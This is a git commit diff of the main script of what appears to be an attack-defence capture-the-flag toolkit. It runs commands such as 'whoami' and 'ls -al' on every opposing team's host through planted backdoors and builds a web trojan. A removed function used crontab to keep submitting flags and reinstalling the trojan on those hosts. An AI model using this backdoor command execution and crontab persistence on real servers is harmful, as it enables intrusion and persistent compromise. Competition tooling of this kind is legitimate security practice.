481f408881f9505f27222aa8a956a858ad2636cf
汉广 <liuchangm7j@vip.qq.com>
2019-10-14 22:24:12 +0800

    update

--- src/main.py
+++ src/main.py
@@ -3,36 +3,32 @@ import Weapons
 import Defends
 import Tools
 import Setting
+import hashlib,random
+
+
 def bckDoor(w):
-    w.useBckDoorIndex=0 #使用哪个后门
-    
-    # print(backdoor.eachIp(w.trojTime))
-    # print(backdoor.eachIpArgs(w.runCmd,'*.php'))
-    print(backdoor.eachIpArgs(w.runCmd,'ls -al'))
-    print(backdoor.eachIpArgs(w.runTeamCmd,'system(\'whoami\')'))
-    
-    print(backdoor.eachIpArgs(buildAndRunCrontabCmd,w))
-def buildAndRunCrontabCmd(index,w):
-    rawCrontabStr_autoSubmit=tools.buildCrontab('*',config.gameUrl,f'token={config.token}&flag=`date +\'%s\'`',1)
-    rawCrontabStr_troj=tools.buildCrontab('*',w.team[index].trojContent,'',2)
-
-    crontabStr,md5Str=tools.buildCmd(f"{rawCrontabStr_autoSubmit}\n{rawCrontabStr_troj}")
-    w.runTeamCmd(index,f'system(\'{crontabStr}\')')
-    return w.runTeamCmd(index,f'system(\'/usr/bin/crontab /tmp/.--{md5Str}.sh\')')
-
+    print(w.eachIp(w.trojTime))
+    print(w.eachIpArgs(w.runCmd,'*.php'))
+    print(w.eachIpArgs(w.runCmd,'ls -al'))
+    print(w.eachIpArgs(w.runTeamCmd,'system(\'whoami\')'))
 if __name__ == "__main__":
     print('script start')
-    config=Setting.Config('setting/Default.json')
-    ssh=Defends.SSH(Defends.SSH.configStart(config[0]))
-    ssh.connect()
-    print(ssh.execCmd("ls -al").getResult())
-    print(ssh.execCmd("cd /app").getResult())
-    print(ssh.execCmd("ls -al").getResult())
+    config=Setting.Config('default.json')[0]
+    webtroj=Weapons.WebTroj(random.randint(1000,9999),config)
     
-    # ssh.backupserver()
-    # #ssh.deploy('bck_20191013_151029.bck')
+    ssh=Defends.SSH(Defends.SSH.configStart(config))
+    while not ssh.connected:
+        ssh.connect()
+    
+    ssh.upload()
+    cur_path=ssh.backupserver()
+    ssh.extractBackup(cur_path)
+    codeReview=Defends.CodeReview(config)
+    codeReview.start()
+    
+    #ssh.deploy('bck_20191013_151029.bck')
     # ssh.reDeploy()
-    # ssh.disconnect()
-    
-    
+    #print(ssh.execCmd('cd /app;ls -al').getMsg())
     pass
+
+
